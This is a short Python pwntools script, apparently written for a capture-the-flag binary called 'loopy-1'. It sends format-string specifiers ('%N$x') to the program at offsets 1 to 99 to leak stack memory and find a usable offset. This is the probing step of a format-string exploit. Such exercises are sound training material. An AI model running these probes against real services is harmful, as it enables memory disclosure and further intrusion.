#!/usr/bin/env python2

from pwn import *

context.log_level = 'critical'

for i in range(1, 100):
    p = process('./loopy-1')
    p.sendlineafter('>', '%{}$x'.format(i))
    print p.recv() + ' : ' + str(i)

    p.close()
